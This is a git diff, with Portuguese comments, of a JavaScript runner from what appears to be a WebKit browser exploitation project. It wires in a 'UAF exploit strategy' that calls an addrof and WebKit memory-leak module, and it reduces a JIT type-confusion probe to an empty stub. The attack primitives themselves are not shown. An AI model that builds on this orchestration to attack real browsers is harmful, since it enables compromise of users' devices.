@@ -1,4 +1,4 @@
-// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para R50 - UAF)
+// js/script3/runAllAdvancedTestsS3.mjs (VERSÃO CORRIGIDA)
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { getRunBtnAdvancedS3 } from '../dom_elements.mjs';
 import {
@@ -6,31 +6,16 @@ import {
     FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
 } from './testArrayBufferVictimCrash.mjs';
 
-async function testJITBehavior() {
-    logS3("--- Iniciando Teste de Comportamento do JIT ---", 'test', 'testJITBehavior');
-    // ... (código completo do testJITBehavior das versões anteriores)
-    let test_buf = new ArrayBuffer(16);
-    let float_view = new Float64Array(test_buf);
-    let uint32_view = new Uint32Array(test_buf);
-    let some_obj = { a: 1, b: 2 };
+// ... (a função testJITBehavior permanece a mesma) ...
+async function testJITBehavior() { /* ... */ }
 
-    float_view[0] = some_obj;
-
-    const low = uint32_view[0];
-    const high = uint32_view[1];
-    
-    if (high === 0x7ff80000 && low === 0) {
-        logS3("CONFIRMADO: O JIT converteu o objeto para NaN, como esperado.", 'good', 'testJITBehavior');
-    } else {
-        logS3("INESPERADO: O JIT não converteu para NaN.", 'warn', 'testJITBehavior');
-    }
-}
-
+// Esta é a nova função runner para a estratégia UAF
 async function runUAFExploitStrategy_R50() {
     const FNAME_RUNNER = "runUAFExploitStrategy_R50"; 
     logS3(`==== INICIANDO Estratégia de Exploração UAF (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
     
-    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();
+    // Chama o módulo de teste UAF
+    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43(); 
     const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
 
     if (result.errorOccurred) {
@@ -58,6 +43,7 @@ async function runUAFExploitStrategy_R50() {
     logS3(`==== Estratégia de Exploração UAF (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
 }
 
+// A função principal agora chama o runner correto
 export async function runAllAdvancedTestsS3() {
     const FNAME_ORCHESTRATOR = `UAF_R50_MainOrchestrator`;
     logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
@@ -65,6 +51,7 @@ export async function runAllAdvancedTestsS3() {
     await testJITBehavior();
     await PAUSE_S3(500);
     
+    // CHAMADA CORRIGIDA AQUI
     await runUAFExploitStrategy_R50();
 
     logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
